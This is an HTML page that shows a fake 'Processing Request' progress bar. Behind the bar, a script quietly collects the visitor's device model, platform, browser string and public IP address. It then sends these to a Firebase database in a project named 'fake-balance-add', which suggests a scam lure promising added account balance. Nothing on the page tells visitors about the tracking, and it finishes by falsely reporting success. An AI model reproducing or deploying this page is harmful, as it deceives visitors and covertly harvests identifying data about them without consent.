<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Processing</title>
<style>
body{
  margin:0;
  background:#f4f6f9;
  font-family:Arial;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
}
.card{
  background:#fff;
  width:320px;
  padding:30px;
  border-radius:12px;
  box-shadow:0 10px 25px rgba(0,0,0,0.1);
  text-align:center;
}
.progress{
  width:100%;
  height:10px;
  background:#eee;
  border-radius:20px;
  margin-top:20px;
  overflow:hidden;
}
.bar{
  width:0%;
  height:100%;
  background:#4CAF50;
  transition:.3s;
}
.status{
  margin-top:15px;
  font-size:14px;
  color:#666;
}
</style>
</head>
<body>

<div class="card">
  <h2>Processing Request</h2>
  <div class="progress">
    <div class="bar" id="bar"></div>
  </div>
  <div class="status" id="status">Please wait...</div>
</div>

<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyBF1ZCJk6WM-cSPF46WHg976812Mo1QuvY",
  authDomain: "fake-balance-add.firebaseapp.com",
  databaseURL: "https://fake-balance-add-default-rtdb.firebaseio.com",
  projectId: "fake-balance-add",
  storageBucket: "fake-balance-add.firebasestorage.app",
  messagingSenderId: "326546385731",
  appId: "1:326546385731:web:7fb0a734ded3b010955df6"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

// Detect Device
async function getDevice(){
  if (navigator.userAgentData) {
    try{
      const ua = await navigator.userAgentData.getHighEntropyValues(["model","platform","platformVersion"]);
      if(ua.model && ua.model !== ""){
        return ua.model;
      }
      return ua.platform + " " + ua.platformVersion;
    }catch{
      return navigator.userAgent;
    }
  }
  return navigator.userAgent;
}

// Get IP
async function getIP(){
  try{
    const res = await fetch("https://api64.ipify.org?format=json");
    const data = await res.json();
    return data.ip;
  }catch{
    return "IP Blocked";
  }
}

async function start(){

  let progress = 0;
  const bar = document.getElementById("bar");
  const status = document.getElementById("status");

  const interval = setInterval(()=>{
    progress += 10;
    bar.style.width = progress + "%";

    if(progress >= 100){
      clearInterval(interval);
      finish();
    }
  },300);

  async function finish(){

    status.innerHTML = "Finalizing...";

    const device = await getDevice();
    const ip = await getIP();

    await push(ref(db,"devices"),{
      device: device,
      platform: navigator.platform,
      browser: navigator.userAgent,
      ip: ip,
      time: new Date().toLocaleString()
    });

    status.innerHTML = "✔ Process Completed Successfully";
  }
}

start();

</script>
</body>
</html>
